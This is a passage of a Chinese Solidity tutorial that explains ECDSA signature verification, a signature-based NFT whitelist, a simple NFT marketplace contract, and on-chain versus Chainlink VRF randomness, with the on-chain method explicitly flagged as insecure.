title="验证签名"></a>验证签名</h3><p>为了验证签名，验证者需要拥有<code>消息</code>，<code>签名</code>，和签名使用的<code>公钥</code>。我们能验证签名的原因是只有<code>私钥</code>的持有者才能够针对交易生成这样的签名，而别人不能。</p><p><strong>4. 通过签名和消息恢复公钥：</strong><code>签名</code>是由数学算法生成的。这里我们使用的是<code>rsv签名</code>，<code>签名</code>中包含<code>r, s, v</code>三个值的信息，长度分别为32 bytes，32 bytes，1 byte。而后，我们可以通过<code>r, s, v</code>及<code>以太坊签名消息</code>来求得<code>公钥</code>。下面的<code>recoverSigner()</code>函数实现了上述步骤，它利用<code>以太坊签名消息 _msgHash</code>和<code>签名 _signature</code>恢复<code>公钥</code>（使用了简单的内联汇编）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// @dev 从_msgHash和签名_signature中恢复signer地址<br>function recoverSigner(bytes32 _msgHash, bytes memory _signature) internal pure returns (address)&#123;<br>    // 检查签名长度，65是标准r,s,v签名的长度<br>    require(_signature.length == 65, &quot;invalid signature length&quot;);<br>    bytes32 r;<br>    bytes32 s;<br>    uint8 v;<br>    // 目前只能用assembly (内联汇编)来从签名中获得r,s,v的值<br>    assembly &#123;<br>        /*<br>        前32 bytes存储签名的长度 (动态数组存储规则)<br>        add(sig, 32) = sig的指针 + 32<br>        等效为略过signature的前32 bytes<br>        mload(p) 载入从内存地址p起始的接下来32 bytes数据<br>        */<br>        // 读取长度数据后的32 bytes<br>        r := mload(add(_signature, 0x20))<br>        // 读取之后的32 bytes<br>        s := mload(add(_signature, 0x40))<br>        // 读取最后一个byte<br>        v := byte(0, mload(add(_signature, 0x60)))<br>    &#125;<br>    // 使用ecrecover(全局函数)：利用 msgHash 和 r,s,v 恢复 signer 地址<br>    return ecrecover(_msgHash, v, r, s);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>5. 对比公钥并验证签名：</strong> 接下来，我们只需要比对恢复的<code>公钥</code>与签名者公钥<code>_signer</code>是否相等：若相等，则签名有效；否则，签名无效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev 通过ECDSA，验证签名地址是否正确，如果正确则返回true<br> * _msgHash为消息的hash<br> * _signature为签名<br> * _signer为签名地址<br> */<br>function verify(bytes32 _msgHash, bytes memory _signature, address _signer) internal pure returns (bool) &#123;<br>    return recoverSigner(_msgHash, _signature) == _signer;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用签名发放白名单"><a href="#利用签名发放白名单" class="headerlink" title="利用签名发放白名单"></a>利用签名发放白名单</h2><p><code>NFT</code>项目方可以利用<code>ECDSA</code>的这个特性发放白名单。由于签名是链下的，不需要<code>gas</code>，因此这种白名单发放模式比<code>Merkle Tree</code>模式还要经济。方法非常简单，项目方利用项目方账户把白名单发放地址签名（可以加上地址可以铸造的<code>tokenId</code>）。然后<code>mint</code>的时候利用<code>ECDSA</code>检验签名是否有效，如果有效，则给他<code>mint</code>。</p><p><code>SignatureNFT</code>合约实现了利用签名发放<code>NFT</code>白名单。</p><h3 id="状态变量-2"><a href="#状态变量-2" class="headerlink" title="状态变量"></a>状态变量</h3><p>合约中共有两个状态变量：</p><ul><li><code>signer</code>：<code>公钥</code>，项目方签名地址。</li><li><code>mintedAddress</code>是一个<code>mapping</code>，记录了已经<code>mint</code>过的地址。</li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>合约中共有4个函数：</p><ul><li>构造函数初始化<code>NFT</code>的名称和代号，还有<code>ECDSA</code>的签名地址<code>signer</code>。</li><li><code>mint()</code>函数接受地址<code>address</code>，<code>tokenId</code>和<code>_signature</code>三个参数，验证签名是否有效：如果有效，则把<code>tokenId</code>的<code>NFT</code>铸造给<code>address</code>地址，并将它记录到<code>mintedAddress</code>。它调用了<code>getMessageHash()</code>，<code>ECDSA.toEthSignedMessageHash()</code>和<code>verify()</code>函数。</li><li><code>getMessageHash()</code>函数将<code>mint</code>地址（<code>address</code>类型）和<code>tokenId</code>（<code>uint256</code>类型）拼成<code>消息</code>。</li><li><code>verify()</code>函数调用了<code>ECDSA</code>库的<code>verify()</code>函数，来进行<code>ECDSA</code>签名验证。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract SignatureNFT is ERC721 &#123;<br>    address immutable public signer; // 签名地址<br>    mapping(address =&gt; bool) public mintedAddress;   // 记录已经mint的地址<br><br>    // 构造函数，初始化NFT合集的名称、代号、签名地址<br>    constructor(string memory _name, string memory _symbol, address _signer)<br>    ERC721(_name, _symbol)<br>    &#123;<br>        signer = _signer;<br>    &#125;<br><br>    // 利用ECDSA验证签名并mint<br>    function mint(address _account, uint256 _tokenId, bytes memory _signature)<br>    external<br>    &#123;<br>        bytes32 _msgHash = getMessageHash(_account, _tokenId); // 将_account和_tokenId打包消息<br>        bytes32 _ethSignedMessageHash = ECDSA.toEthSignedMessageHash(_msgHash); // 计算以太坊签名消息<br>        require(verify(_ethSignedMessageHash, _signature), &quot;Invalid signature&quot;); // ECDSA检验通过<br>        require(!mintedAddress[_account], &quot;Already minted!&quot;); // 地址没有mint过<br>        _mint(_account, _tokenId); // mint<br>        mintedAddress[_account] = true; // 记录mint过的地址<br>    &#125;<br><br>    /*<br>     * 将mint地址（address类型）和tokenId（uint256类型）拼成消息msgHash<br>     * _account: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * _tokenId: 0<br>     * 对应的消息: 0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c<br>     */<br>    function getMessageHash(address _account, uint256 _tokenId) public pure returns(bytes32)&#123;<br>        return keccak256(abi.encodePacked(_account, _tokenId));<br>    &#125;<br><br>    // ECDSA验证，调用ECDSA库的verify()函数<br>    function verify(bytes32 _msgHash, bytes memory _signature)<br>    public view returns (bool)<br>    &#123;<br>        return ECDSA.verify(_msgHash, _signature, signer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="38-NFT交易所"><a href="#38-NFT交易所" class="headerlink" title="38. NFT交易所"></a>38. NFT交易所</h1><p><code>OpenSea</code>是以太坊上最大的<code>NFT</code>交易平台，总交易总量达到了<code>$300亿</code>。<code>OpenSea</code>在交易中抽成<code>2.5%</code>，因此它通过用户交易至少获利了<code>$7.5亿</code>。另外，它的运作并不去中心化，且不准备发币补偿用户。<code>NFT</code>玩家苦<code>OpenSea</code>久已，今天我们就利用智能合约搭建一个零手续费的去中心化<code>NFT</code>交易所：<code>NFTSwap</code>。</p><h2 id="设计逻辑"><a href="#设计逻辑" class="headerlink" title="设计逻辑"></a>设计逻辑</h2><ul><li>卖家：出售<code>NFT</code>的一方，可以挂单<code>list</code>、撤单<code>revoke</code>、修改价格<code>update</code>。</li><li>买家：购买<code>NFT</code>的一方，可以购买<code>purchase</code>。</li><li>订单：卖家发布的<code>NFT</code>链上订单，一个系列的同一<code>tokenId</code>最多存在一个订单，其中包含挂单价格<code>price</code>和持有人<code>owner</code>信息。当一个订单交易完成或被撤单后，其中信息清零。</li></ul><h2 id="NFTSwap合约"><a href="#NFTSwap合约" class="headerlink" title="NFTSwap合约"></a><code>NFTSwap</code>合约</h2><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>合约包含<code>4</code>个事件，对应挂单<code>list</code>、撤单<code>revoke</code>、修改价格<code>update</code>、购买<code>purchase</code>这四个行为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">event List(address indexed seller, address indexed nftAddr, uint256 indexed tokenId, uint256 price);<br>event Purchase(address indexed buyer, address indexed nftAddr, uint256 indexed tokenId, uint256 price);<br>event Revoke(address indexed seller, address indexed nftAddr, uint256 indexed tokenId);    <br>event Update(address indexed seller, address indexed nftAddr, uint256 indexed tokenId, uint256 newPrice);<br></code></pre></td></tr></table></figure><h3 id="订单"><a href="#订单" class="headerlink" title="订单"></a>订单</h3><p><code>NFT</code>订单抽象为<code>Order</code>结构体，包含挂单价格<code>price</code>和持有人<code>owner</code>信息。<code>nftList</code>映射记录了订单是对应的<code>NFT</code>系列（合约地址）和<code>tokenId</code>信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 定义order结构体<br>struct Order&#123;<br>    address owner;<br>    uint256 price; <br>&#125;<br>// NFT Order映射<br>mapping(address =&gt; mapping(uint256 =&gt; Order)) public nftList;<br></code></pre></td></tr></table></figure><h3 id="回退函数"><a href="#回退函数" class="headerlink" title="回退函数"></a>回退函数</h3><p>在<code>NFTSwap</code>合约中，用户使用<code>ETH</code>购买<code>NFT</code>。因此，合约需要实现<code>fallback()</code>函数来接收<code>ETH</code>。–</p><p>光有回退函数还是不行的，还要有接收函数表示你是一个具备eth收款的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 回退函数 在`NFTSwap`合约中，用户使用`ETH`购买`NFT`。因此，合约需要实现`fallback()`函数来接收`ETH`。<br>fallback() external payable&#123;&#125;<br><br><br>// 接收 ETH 的函数<br>receive() external payable &#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h3><p>合约实现了<code>4</code>个交易相关的函数：</p><p>合约实现了<code>4</code>个交易相关的函数：</p><ul><li>挂单<code>list()</code>：卖家创建<code>NFT</code>并创建订单，并释放<code>List</code>事件。参数为<code>NFT</code>合约地址<code>_nftAddr</code>，<code>NFT</code>对应的<code>_tokenId</code>，挂单价格<code>_price</code>（**注意：单位是<code>wei</code>**）。成功后，<code>NFT</code>会从卖家转到<code>NFTSwap</code>合约中。</li><li>撤单<code>revoke()</code>：卖家撤回挂单，并释放<code>Revoke</code>事件。参数为<code>NFT</code>合约地址<code>_nftAddr</code>，<code>NFT</code>对应的<code>_tokenId</code>。成功后，<code>NFT</code>会从<code>NFTSwap</code>合约转回卖家。</li><li>修改价格<code>update()</code>：卖家修改<code>NFT</code>订单价格，并释放<code>Update</code>事件。参数为<code>NFT</code>合约地址<code>_nftAddr</code>，<code>NFT</code>对应的<code>_tokenId</code>，更新后的挂单价格<code>_newPrice</code>（**注意：单位是<code>wei</code>**）。</li><li>购买<code>purchase()</code>：买家支付<code>ETH</code>购买挂单的<code>NFT</code>，并释放<code>Purchase</code>事件。参数为<code>NFT</code>合约地址<code>_nftAddr</code>，<code>NFT</code>对应的<code>_tokenId</code>。成功后，<code>ETH</code>将转给卖家，<code>NFT</code>将从<code>NFTSwap</code>合约转给买家。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.20;<br><br>import &#123;IERC721&#125; from &quot;./34_IERC721.sol&quot;;<br>import &#123;IERC721Receiver&#125; from &quot;./34_IERC721Receiver.sol&quot;;<br><br><br>contract NFTSwap is IERC721Receiver &#123;<br>    // 上架事件,打印出售者，NFT, NFTID ，单价<br>    event List(<br>        address indexed seller,<br>        address indexed nftAddr,<br>        uint256 indexed tokenId,<br>        uint256 price);<br>    // 购买事件,打印出售者，NFT, NFTID ，单价<br>    event Purchase(<br>        address indexed buyer,<br>        address indexed nftAddr,<br>        uint256 indexed tokenId,<br>        uint256 price);<br>    // 撤单<br>    event Revoke(<br>        address indexed seller,<br>        address indexed nftAddr,<br>        uint256 indexed tokenId);<br>    // 修改单价<br>    event Update(<br>        address indexed seller,<br>        address indexed nftAddr,<br>        uint256 indexed tokenId,<br>        uint256 price);<br>    // 定义order订单结构体，一个订单就是一个组合<br>    struct Order &#123;<br>        address owner;<br>        uint256 price;<br>    &#125;<br><br>    // NFT Order 映射<br>    mapping(address =&gt; mapping(uint256 =&gt; Order)) public nftList;<br><br>    // 回退函数 在`NFTSwap`合约中，用户使用`ETH`购买`NFT`。因此，合约需要实现`fallback()`函数来接收`ETH`。<br><br>    // 接收 ETH 的函数<br>    receive() external payable &#123;&#125;<br>    // 回退函数 在`NFTSwap`合约中，用户使用`ETH`购买`NFT`。因此，合约需要实现`fallback()`函数来接收`ETH`。<br><br>    fallback() external payable&#123;&#125;<br>    // 挂单， 卖家上架NFT，合约地址为_nftAddr，tokenId为_tokenId，价格_price为以太坊（单位是wei）<br>    function list(address _nftAddr, uint256 _tokenId, uint256 _price) public &#123;<br>        IERC721 _nft = IERC721(_nftAddr); // 声明IERC721接口合约变量<br>        require(_nft.getApproved(_tokenId) == address(this), &quot;Need Approval&quot;);// 合约必须要取得用户授权<br>        require(_price &gt; 0);// 单价必须大于0<br>        Order storage _order = nftList[_nftAddr][_tokenId];//设置NFT持有人和价格<br>        _order.owner = msg.sender;<br>        _order.price = _price; // 将单价存入order结构体中<br>        // 将NFT转账到合约<br>        _nft.safeTransferFrom(msg.sender, address(this), _tokenId);<br><br>        // 释放List事件，告诉大家挂单了<br>        emit List(msg.sender, _nftAddr, _tokenId, _price);<br>        // payable(_nftAddr).transfer(0 ether);      <br>    &#125;<br>    // 购买：买家购买NFT，合约为_nftAddr,tokenId为_tokenId,调用函数时要附带着ETH<br>    function purchase(address _nftAddr, uint256 _tokenId) public payable &#123;<br>        Order storage _order = nftList[_nftAddr][_tokenId];// 取得Order<br>        require(_order.price &gt; 0, &quot;Invalid Price&quot;);//NFT的价格要大于0<br>        require(msg.value &gt;= _order.price, &quot;Increase price&quot;);//购买价要大于当前单价<br>        // 声明IERC721合约接口变量<br>        IERC721 _nft = IERC721(_nftAddr);<br>        require(_nft.ownerOf(_tokenId)==address(this),&quot;Invalid Order&quot;);//NFT在合约中<br><br>        // 将NFT转给买家<br>        _nft.safeTransferFrom(address(this),msg.sender,_tokenId);<br>        // 将ETH转给卖家<br>        payable(_order.owner).transfer(_order.price);<br>        //多余的ETH退款给买家<br>        if (msg.value&gt;_order.price)&#123;<br>            payable(msg.sender).transfer(msg.value-_order.price);<br>        &#125;<br>        // 释放purchase事件来公布咱们完成了购买<br>        emit Purchase(msg.sender,_nftAddr,_tokenId,_order.price);<br><br>        // 在nft列表里面删除对应的订单---&gt;通过nft地址和token地址来把整个Order订单结构体删除<br>        delete nftList[_nftAddr][_tokenId];<br><br>    &#125;<br>    // 撤单，卖家取消订单，这里就不需要价格了，只需要对应的nft地址和tokenId<br>    function revoke(address _nftAddr,uint256 _tokenId) public&#123;<br>        Order storage _order =nftList[_nftAddr][_tokenId];// 把对应的NFT订单结构体拿出来<br>        require(_order.owner==msg.sender,&quot;You is not Owner,&quot;);//你不是拥有者呀<br>        //声明IERC721的接口合约变量<br>        IERC721 _nft = IERC721(_nftAddr);<br>        require(_nft.ownerOf(_tokenId)==address(this),&quot;Invalid Order&quot;);//NFT在合约中<br>        // 将NFT转给卖家家<br>        _nft.safeTransferFrom(address(this),msg.sender,_tokenId);<br>        // 在nft列表里面删除对应的订单---&gt;通过nft地址和token地址来把整个Order订单结构体删除<br>        delete nftList[_nftAddr][_tokenId];<br>        // 释放revoke事件来公布卖家完成了撤单<br>        emit Revoke(msg.sender,_nftAddr,_tokenId);<br><br>    &#125;<br>    // 调整价格: 卖家调整挂单价格---用到了单价入参<br>    function update(address _nftAddr, uint256 _tokenId, uint256 _newPrice)public &#123;<br>        require(_newPrice &gt; 0);// 单价必须大于0<br>        Order storage _order = nftList[_nftAddr][_tokenId];//设置NFT持有人和价格<br>        require(_order.owner==msg.sender,&quot;You is not Owner,&quot;);//你不是拥有者呀<br>//<br>        IERC721 _nft = IERC721(_nftAddr); // 声明IERC721接口合约变量<br>        require(_nft.ownerOf(_tokenId)==address(this),&quot;This contract is Not in owner&quot;);// 这个合约必须是这个NFT的拥有者<br>//        require(_nft.getApproved(_tokenId) == address(this), &quot;Need Approval&quot;);// 合约必须要取得用户授权<br>        _order.price = _newPrice; // 将单价存入order结构体中<br><br>        // 释放Update事件，告诉大家改价了<br>        emit Update(msg.sender, _nftAddr, _tokenId, _newPrice);<br>    &#125;<br>    // 实现&#123;IERC721Receiver&#125;的onERC721Received，能够接收ERC721代币<br>    function onERC721Received(<br>        address operator,<br>        address from,<br>        uint tokenId,<br>        bytes calldata data<br>    ) external override returns (bytes4)&#123;<br>        return IERC721Receiver.onERC721Received.selector;<br>    &#125;<br>&#125;<br><br>// contract NFTSWAP &#123;<br><br>// &#125;<br></code></pre></td></tr></table></figure><h1 id="39-链上随机数"><a href="#39-链上随机数" class="headerlink" title="39. 链上随机数"></a>39. 链上随机数</h1><p>很多以太坊上的应用都需要用到随机数，例如<code>NFT</code>随机抽取<code>tokenId</code>、抽盲盒、<code>gamefi</code>战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（<code>public</code>）且确定性（<code>deterministic</code>）的，它没法像其他编程语言一样给开发者提供生成随机数的方法。这一讲我们将介绍链上（哈希函数）和链下（<code>chainlink</code>预言机）随机数生成的两种方法，并利用它们做一款<code>tokenId</code>随机铸造的<code>NFT</code>。</p><h2 id="链上随机数生成"><a href="#链上随机数生成" class="headerlink" title="链上随机数生成"></a>链上随机数生成</h2><p>我们可以将一些链上的全局变量作为种子，利用<code>keccak256()</code>哈希函数来获取伪随机数。这是因为哈希函数具有灵敏性和均一性，可以得到“看似”随机的结果。下面的<code>getRandomOnchain()</code>函数利用全局变量<code>block.timestamp</code>，<code>msg.sender</code>和<code>blockhash(block.number-1)</code>作为种子来获取随机数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/** <br>* 链上伪随机数生成<br>* 利用keccak256()打包一些链上的全局变量/自定义变量<br>* 返回时转换成uint256类型<br>*/<br>function getRandomOnchain() public view returns(uint256)&#123;<br>    // remix运行blockhash会报错<br>    bytes32 randomBytes = keccak256(abi.encodePacked(block.timestamp, msg.sender, blockhash(block.number-1)));<br>    <br>    return uint256(randomBytes);<br>&#125;<br></code></pre></td></tr></table></figure><p>**注意:**，这个方法并不安全：</p><ul><li>首先，<code>block.timestamp</code>，<code>msg.sender</code>和<code>blockhash(block.number-1)</code>这些变量都是公开的，使用者可以预测出用这些种子生成出的随机数，并挑出他们想要的随机数执行合约。</li><li>其次，矿工可以操纵<code>blockhash</code>和<code>block.timestamp</code>，使得生成的随机数符合他的利益。</li></ul><p>尽管如此，由于这种方法是最便捷的链上随机数生成方法，大量项目方依靠它来生成不安全的随机数，包括知名的项目<code>meebits</code>，<code>loots</code>等。当然，这些项目也无一例外的被<a href="https://forum.openzeppelin.com/t/understanding-the-meebits-exploit/8281">攻击</a>了：攻击者可以铸造任何他们想要的稀有<code>NFT</code>，而非随机抽取。</p><h2 id="链下随机数生成"><a href="#链下随机数生成" class="headerlink" title="链下随机数生成"></a>链下随机数生成</h2><p>我们可以在链下生成随机数，然后通过预言机把随机数上传到链上。<code>Chainlink</code>提供<code>VRF</code>（可验证随机函数）服务，链上开发者可以支付<code>LINK</code>代币来获取随机数。<code> Chainlink VRF</code>有两个版本，第二个版本需要官网注册并预付费，比第一个版本多许多操作，需要花费更多的gas，但取消订阅后可以拿回剩余的Link，这里介绍第二个版本<code>Chainlink VRF V2</code>。</p><p><img src="/img/web3/39-1.png" alt="39-1"></p><p>我们将用一个简单的合约介绍使用<code>Chainlink VRF</code>的步骤。<code>RandomNumberConsumer</code>合约可以向<code>VRF</code>请求随机数，并存储在状态变量<code>randomWords</code>中。</p><p><strong>1. 申请Subscription并转入<code>Link</code>代币’</strong></p><p>在Chainlink VRF网站<a href="https://vrf.chain.link/">这里</a>上创建一个<code>Subscription</code>，其中邮箱和项目名都是选填</p><p>创建完成后往<code>Subscription</code>中转入一些<code>Link</code>代币。测试网的<code>LINK</code>代币可以从<a href="https://faucets.chain.link/">LINK水龙头</a>领取。</p><p><strong>2. 用户合约继承<code>VRFConsumerBaseV2</code></strong></p><p>为了使用<code>VRF</code>获取随机数，合约需要继承<code>VRFConsumerBaseV2</code>合约，并在构造函数中初始化<code>VRFCoordinatorV2Interface</code>和<code>Subscription Id</code>。</p><p><strong>注意:</strong> 不同链对应不同的参数，在<a href="https://docs.chain.link/vrf/v2/subscription/supported-networks">这里</a>查询。</p><p>教程中我们使用<code>Sepolia</code>测试网。</p><p><strong>2. 用户合约申请随机数</strong></p><p>用户可以调用从<code>VRFCoordinatorV2Interface</code>接口合约中的<code>requestRandomWords</code>函数申请随机数，并返回申请标识符<code>requestId</code>。这个申请会传递给<code>VRF</code>合约。</p><p><strong>注意:</strong> 合约部署后，需要把合约加入到<code>Subscription</code>的<code>Consumers</code>中，才能发送申请。也就是相当于添加白名单一样</p><p><strong>3. <code>Chainlink</code>节点链下生成随机数和<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/37_Signature/readme.md">数字签名</a>，并发送给<code>VRF</code>合约</strong></p><p><strong>4. <code>VRF</code>合约验证签名有效性</strong></p><p><strong>5. 用户合约接收并使用随机数</strong></p><p>在<code>VRF</code>合约验证签名有效之后，会自动调用用户合约的回退函数<code>fulfillRandomness()</code>，将链下生成的随机数发送过来。用户要把消耗随机数的逻辑写在这里。</p><p><strong>注意:</strong> 用户申请随机数时调用的<code>requestRandomness()</code>和<code>VRF</code>合约返回随机数时调用的回退函数<code>fulfillRandomness()</code>是两笔交易，调用者分别是用户合约和<code>VRF</code>合约，后者比前者晚几分钟（不同链延迟不一样）。</p><h3 id="通过预言机在练下生成随机数铸造NFT"><a href="#通过预言机在练下生成随机数铸造NFT" class="headerlink" title="通过预言机在练下生成随机数铸造NFT"></a>通过预言机在练下生成随机数铸造NFT</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span 